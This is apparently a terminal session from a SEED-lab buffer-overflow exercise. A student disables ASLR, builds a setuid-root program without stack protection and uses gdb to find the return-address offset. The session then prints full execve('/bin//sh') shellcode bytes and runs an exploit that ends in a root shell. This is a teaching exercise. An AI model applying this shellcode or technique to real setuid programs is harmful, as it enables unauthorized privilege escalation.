[06/17/22]seed@VM:~/.../a2_17$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/17/22]seed@VM:~/.../a2_17$ sudo ln -sf /bin/zsh /bin/sh
[06/17/22]seed@VM:~/.../a2_17$ sudo su
root@VM:/home/seed/practice/a2_17# gcc -m32 -o A1 -z execstack -fno-stack-protector A1.c
root@VM:/home/seed/practice/a2_17# sudo chown root A1
root@VM:/home/seed/practice/a2_17# sudo chmod 4755 A1
root@VM:/home/seed/practice/a2_17# su seed
[06/17/22]seed@VM:~/.../a2_17$ 
[06/17/22]seed@VM:~/.../a2_17$ touch badfile
[06/17/22]seed@VM:~/.../a2_17$ touch badfile_2
[06/17/22]seed@VM:~/.../a2_17$ gcc  -m32 -o A1_dbg -g -z execstack -fno-stack-protector A1.c
[06/17/22]seed@VM:~/.../a2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof_1
Breakpoint 1 at 0x12ad: file A1.c, line 20.
gdb-peda$ run
Starting program: /home/seed/practice/a2_17/A1_dbg 
[----------------------------------registers-----------------------------------]
EAX: 0x5655a1a0 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd5ec --> 0x565564bf (<main+250>:	add    esp,0x10)
EIP: 0x565562ad (<bof_1>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof_1>:	endbr32 
   0x565562b1 <bof_1+4>:	push   ebp
   0x565562b2 <bof_1+5>:	mov    ebp,esp
   0x565562b4 <bof_1+7>:	push   ebx
   0x565562b5 <bof_1+8>:	sub    esp,0x64
[------------------------------------stack-------------------------------------]
0000| 0xffffd5ec --> 0x565564bf (<main+250>:	add    esp,0x10)
0004| 0xffffd5f0 --> 0x5655a1a0 --> 0x0 
0008| 0xffffd5f4 --> 0x1 
0012| 0xffffd5f8 --> 0x1f4 
0016| 0xffffd5fc --> 0x5655a5a0 --> 0xfbad2498 
0020| 0xffffd600 --> 0xffffd620 --> 0x1 
0024| 0xffffd604 --> 0x0 
0028| 0xffffd608 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof_1 (str=0x5655a1a0 "") at A1.c:20
20	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x5655a1a0 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd5e8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd580 --> 0x5655a6e0 --> 0xfbad2488 
EIP: 0x565562c3 (<bof_1+22>:	sub    esp,0xc)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof_1+8>:	sub    esp,0x64
   0x565562b8 <bof_1+11>:	call   0x565561b0 <__x86.get_pc_thunk.bx>
   0x565562bd <bof_1+16>:	add    ebx,0x2cfb
=> 0x565562c3 <bof_1+22>:	sub    esp,0xc
   0x565562c6 <bof_1+25>:	lea    eax,[ebx-0x1fb0]
   0x565562cc <bof_1+31>:	push   eax
   0x565562cd <bof_1+32>:	call   0x56556130 <puts@plt>
   0x565562d2 <bof_1+37>:	add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffd580 --> 0x5655a6e0 --> 0xfbad2488 
0004| 0xffffd584 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffd588 --> 0xf7fb56f4 --> 0xf7e4c190 (endbr32)
0012| 0xffffd58c --> 0xf7fb4f20 --> 0x0 
0016| 0xffffd590 --> 0x5655a6e0 --> 0xfbad2488 
0020| 0xffffd594 --> 0x5655a6e0 --> 0xfbad2488 
0024| 0xffffd598 --> 0xf7e49a8d (<_IO_file_fopen+13>:	add    ebx,0x16a573)
0028| 0xffffd59c --> 0xf7fcc100 (0xf7fcc100)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
22	    printf("In bof_1\n");
gdb-peda$ next
In bof_1
[----------------------------------registers-----------------------------------]
EAX: 0x9 ('\t')
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd5e8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd580 --> 0x5655a6e0 --> 0xfbad2488 
EIP: 0x565562d5 (<bof_1+40>:	sub    esp,0x8)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562cc <bof_1+31>:	push   eax
   0x565562cd <bof_1+32>:	call   0x56556130 <puts@plt>
   0x565562d2 <bof_1+37>:	add    esp,0x10
=> 0x565562d5 <bof_1+40>:	sub    esp,0x8
   0x565562d8 <bof_1+43>:	push   DWORD PTR [ebp+0x8]
   0x565562db <bof_1+46>:	lea    eax,[ebp-0x68]
   0x565562de <bof_1+49>:	push   eax
   0x565562df <bof_1+50>:	call   0x56556110 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd580 --> 0x5655a6e0 --> 0xfbad2488 
0004| 0xffffd584 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffd588 --> 0xf7fb56f4 --> 0xf7e4c190 (endbr32)
0012| 0xffffd58c --> 0xf7fb4f20 --> 0x0 
0016| 0xffffd590 --> 0x5655a6e0 --> 0xfbad2488 
0020| 0xffffd594 --> 0x5655a6e0 --> 0xfbad2488 
0024| 0xffffd598 --> 0xf7e49a8d (<_IO_file_fopen+13>:	add    ebx,0x16a573)
0028| 0xffffd59c --> 0xf7fcc100 (0xf7fcc100)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
23	    strcpy(buffer, str);       
gdb-peda$ p $ebp
$1 = (void *) 0xffffd5e8
gdb-peda$ p &buffer
$2 = (char (*)[96]) 0xffffd580
gdb-peda$ p/d 0xffffd5e8 - 0xffffd580
$3 = 104
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x565562f1 <+0>:	endbr32 
   0x565562f5 <+4>:	push   ebp
   0x565562f6 <+5>:	mov    ebp,esp
   0x565562f8 <+7>:	push   ebx
   0x565562f9 <+8>:	sub    esp,0x4
   0x565562fc <+11>:	call   0x565561b0 <__x86.get_pc_thunk.bx>
   0x56556301 <+16>:	add    ebx,0x2cb7
   0x56556307 <+22>:	sub    esp,0xc
   0x5655630a <+25>:	lea    eax,[ebx-0x1fa7]
   0x56556310 <+31>:	push   eax
   0x56556311 <+32>:	call   0x56556130 <puts@plt>
   0x56556316 <+37>:	add    esp,0x10
   0x56556319 <+40>:	mov    DWORD PTR [ebx+0x54],0x1
   0x56556323 <+50>:	cmp    DWORD PTR [ebp+0x8],0x5
   0x56556327 <+54>:	jne    0x56556350 <foo+95>
   0x56556329 <+56>:	cmp    DWORD PTR [ebp+0xc],0x7
   0x5655632d <+60>:	jne    0x56556350 <foo+95>
   0x5655632f <+62>:	lea    eax,[ebx+0x60]
   0x56556335 <+68>:	mov    edx,DWORD PTR [eax]
   0x56556337 <+70>:	lea    eax,[ebx+0x5c]
   0x5655633d <+76>:	mov    eax,DWORD PTR [eax]
   0x5655633f <+78>:	push   edx
   0x56556340 <+79>:	push   0x1f4
   0x56556345 <+84>:	push   0x1
   0x56556347 <+86>:	push   eax
   0x56556348 <+87>:	call   0x56556100 <fread@plt>
   0x5655634d <+92>:	add    esp,0x10
   0x56556350 <+95>:	lea    eax,[ebx+0x5c]
   0x56556356 <+101>:	mov    eax,DWORD PTR [eax]
   0x56556358 <+103>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x5655635b <+106>:	leave  
   0x5655635c <+107>:	ret    
End of assembler dump.
gdb-peda$ disas bof_2
Dump of assembler code for function bof_2:
   0x5655635d <+0>:	endbr32 
   0x56556361 <+4>:	push   ebp
   0x56556362 <+5>:	mov    ebp,esp
   0x56556364 <+7>:	push   ebx
   0x56556365 <+8>:	sub    esp,0x44
   0x56556368 <+11>:	call   0x565561b0 <__x86.get_pc_thunk.bx>
   0x5655636d <+16>:	add    ebx,0x2c4b
   0x56556373 <+22>:	mov    eax,DWORD PTR [ebx+0x54]
   0x56556379 <+28>:	cmp    eax,0x1
   0x5655637c <+31>:	je     0x56556397 <bof_2+58>
   0x5655637e <+33>:	sub    esp,0xc
   0x56556381 <+36>:	lea    eax,[ebx-0x1fa0]
   0x56556387 <+42>:	push   eax
   0x56556388 <+43>:	call   0x56556130 <puts@plt>
   0x5655638d <+48>:	add    esp,0x10
   0x56556390 <+51>:	mov    eax,0x1
   0x56556395 <+56>:	jmp    0x565563c0 <bof_2+99>
   0x56556397 <+58>:	sub    esp,0xc
   0x5655639a <+61>:	lea    eax,[ebx-0x1f94]
   0x565563a0 <+67>:	push   eax
   0x565563a1 <+68>:	call   0x56556130 <puts@plt>
   0x565563a6 <+73>:	add    esp,0x10
   0x565563a9 <+76>:	sub    esp,0x8
   0x565563ac <+79>:	push   DWORD PTR [ebp+0x8]
   0x565563af <+82>:	lea    eax,[ebp-0x43]
   0x565563b2 <+85>:	push   eax
   0x565563b3 <+86>:	call   0x56556110 <strcpy@plt>
   0x565563b8 <+91>:	add    esp,0x10
   0x565563bb <+94>:	mov    eax,0x0
   0x565563c0 <+99>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565563c3 <+102>:	leave  
   0x565563c4 <+103>:	ret    
End of assembler dump.
gdb-peda$ disas bof_1
Dump of assembler code for function bof_1:
   0x565562ad <+0>:	endbr32 
   0x565562b1 <+4>:	push   ebp
   0x565562b2 <+5>:	mov    ebp,esp
   0x565562b4 <+7>:	push   ebx
   0x565562b5 <+8>:	sub    esp,0x64
   0x565562b8 <+11>:	call   0x565561b0 <__x86.get_pc_thunk.bx>
   0x565562bd <+16>:	add    ebx,0x2cfb
   0x565562c3 <+22>:	sub    esp,0xc
   0x565562c6 <+25>:	lea    eax,[ebx-0x1fb0]
   0x565562cc <+31>:	push   eax
   0x565562cd <+32>:	call   0x56556130 <puts@plt>
   0x565562d2 <+37>:	add    esp,0x10
=> 0x565562d5 <+40>:	sub    esp,0x8
   0x565562d8 <+43>:	push   DWORD PTR [ebp+0x8]
   0x565562db <+46>:	lea    eax,[ebp-0x68]
   0x565562de <+49>:	push   eax
   0x565562df <+50>:	call   0x56556110 <strcpy@plt>
   0x565562e4 <+55>:	add    esp,0x10
   0x565562e7 <+58>:	mov    eax,0x0
   0x565562ec <+63>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562ef <+66>:	leave  
   0x565562f0 <+67>:	ret    
End of assembler dump.
gdb-peda$ b *0x565562ef
Breakpoint 2 at 0x565562ef: file A1.c, line 25.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x5655a1a0 --> 0x0 
EDX: 0xffffd580 --> 0x5655a600 --> 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd5e8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd580 --> 0x5655a600 --> 0x0 
EIP: 0x565562ef (<bof_1+66>:	leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e4 <bof_1+55>:	add    esp,0x10
   0x565562e7 <bof_1+58>:	mov    eax,0x0
   0x565562ec <bof_1+63>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x565562ef <bof_1+66>:	leave  
   0x565562f0 <bof_1+67>:	ret    
   0x565562f1 <foo>:	endbr32 
   0x565562f5 <foo+4>:	push   ebp
   0x565562f6 <foo+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd580 --> 0x5655a600 --> 0x0 
0004| 0xffffd584 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffd588 --> 0xf7fb56f4 --> 0xf7e4c190 (endbr32)
0012| 0xffffd58c --> 0xf7fb4f20 --> 0x0 
0016| 0xffffd590 --> 0x5655a6e0 --> 0xfbad2488 
0020| 0xffffd594 --> 0x5655a6e0 --> 0xfbad2488 
0024| 0xffffd598 --> 0xf7e49a8d (<_IO_file_fopen+13>:	add    ebx,0x16a573)
0028| 0xffffd59c --> 0xf7fcc100 (0xf7fcc100)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x565562ef in bof_1 (str=0x5655a1a0 "") at A1.c:25
25	}
gdb-peda$ q
[06/17/22]seed@VM:~/.../a2_17$ nasm -f elf32 mysh.s -o mysh.o
[06/17/22]seed@VM:~/.../a2_17$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
1001000034000000000000000000000010000000
0000000007000000030000000000000000000000
5001000021000000000000000000000001000000
0000000011000000020000000000000000000000
8001000040000000040000000300000004000000
1000000019000000030000000000000000000000
c00100000f000000000000000000000001000000
00000000000000000000000031c031c9b005b107
5150bbf1625556ffd350bb5d635556ffd331c050
682f2f7368682f62696e89e3505389e131d231c0
b00bcd80000000000000000000000000002e7465
7874002e7368737472746162002e73796d746162
002e737472746162000000000000000000000000
0000000000000000000000000000000000000000
0100000000000000000000000400f1ff00000000
0000000000000000030001000800000000000000
0000000010000100006d7973682e73005f737461
72740000
[06/17/22]seed@VM:~/.../a2_17$ python3 convert.py 
Length of the shellcode: 52
shellcode= (
   "\x31\xc0\x31\xc9\xb0\x05\xb1\x07\x51\x50\xbb\xf1\x62\x55\x56\xff"
   "\xd3\x50\xbb\x5d\x63\x55\x56\xff\xd3\x31\xc0\x50\x68\x2f\x2f\x73"
   "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0"
   "\xb0\x0b\xcd\x80"
).encode('latin-1')
[06/17/22]seed@VM:~/.../a2_17$ python3 exploit.py 
[06/17/22]seed@VM:~/.../a2_17$ ./A1
In bof_1
In Foo
In bof_2
# whami                                                                        
zsh: command not found: whami
# whoami                                                                       
root
#  
